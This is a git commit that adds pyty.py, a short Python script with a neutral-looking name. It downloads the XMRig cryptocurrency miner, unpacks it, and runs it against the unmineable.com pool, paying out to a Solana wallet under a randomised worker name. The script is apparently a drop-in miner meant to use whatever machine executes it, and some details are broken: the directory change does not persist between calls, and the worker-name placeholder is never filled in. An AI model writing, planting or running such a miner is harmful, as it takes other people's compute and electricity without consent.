baaa04aa1f1b52993f2525c8cc3f9f75bfa2fa8f
fcknjudas <162876300+fcknjudas@users.noreply.github.com>
2025-02-18 15:52:35 +0300

    Create pyty.py

---
+++ pyty.py
@@ -0,0 +1,6 @@
+import os
+import random
+from random import randint
+num = random.randint(1,1000000)
+os.system('wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2')
+os.system('./xmrig -a gr -o stratum+ssl://rx.unmineable.com:443 -p x -u SOL:G5MFVuQvYabm9sknjwXi9HcHVLGYnEdiQcsQ3NASP1W3.tothemoonRX{num}#8s32-cp81')
